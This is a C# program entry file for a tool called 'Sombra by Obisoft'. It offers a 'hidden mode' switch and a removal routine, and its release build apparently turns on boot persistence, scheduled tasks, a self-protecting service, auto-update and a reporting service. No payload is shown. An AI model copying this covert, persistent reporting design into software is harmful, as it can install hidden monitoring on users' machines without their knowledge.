using Sombra.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using Sombra.Service;
using Sombra.Middleware;
using System.Runtime.InteropServices;

namespace Sombra
{
    public class Program
    {
        public static void Main(string[] args)
        {
            Logger.Print("\n\n Sombra by Obisoft.\n\n Version : " + Strings.Version);
            if (args.Length > 0)
            {
                var Arg = args[0];
                switch (Arg.Trim('-').Substring(0, 1))
                {
                    case "v":
                        break;
                    case "h":
                        var host = new HostBuilder().UseStartUp(null);
                        host.Run();
                        Logger.Print("\n\n-v -version\t\tView current version number.");
                        Logger.Print("-h -help\t\tView help.");
                        Logger.Print("-s -switch\t\tSwitch to hidden mode.");
                        Logger.Print("-r -remove\t\tRemove created startup service.");
                        break;
                    case "s":
                        ProcessService.StartProcess(CellFileInfo.ProgramFile, false);
                        break;
                    case "r":
                        SelfDestory();
                        break;
                }
                return;
            }
            Run();
        }

        public static void Run()
        {
#if DEBUG
            var server = new SombraServer();

            var host = new HostBuilder()
                .UseAutoUpdateService(CurrentVersion: Strings.Version, Debug: true, ForceCurrent: true)
                .UseProtectorService(Disable: true, Debug: true)
                .UseStartWithBootService(Set: false)
                .UseTaskSchedulerService(Disabled: true)
                .UseReportService(TimeOut: 1000, Delay: true)
                .UseServer(server)
                .UseStartUp(server);
#else
            var host = new HostService()
                .UseAutoUpdateService(CurrentVersion: Strings.Version, Debug: false, ForceCurrent: false)
                .UseProtectorService(Disable: false, Debug: false)
                .UseStartWithBootService(Set: true)
                .UseTaskSchedulerService(Disabled: false)
                .UseReportService(TimeOut: 1000, Delay: false)
                .UseStartUp<StartUp>();
#endif
            host.Run();
        }

        public static void SelfDestory()
        {
            var Destoryer = new HostBuilder()
                .UseTaskSchedulerService(Disabled: true)
                .UseStartWithBootService(Set: false)
                .UseStartUp(null);

            Destoryer.Run();
            Logger.PrintSuccess("Removed all records. Please restart your computer and delete all files by yourself!");
        }
    }
}
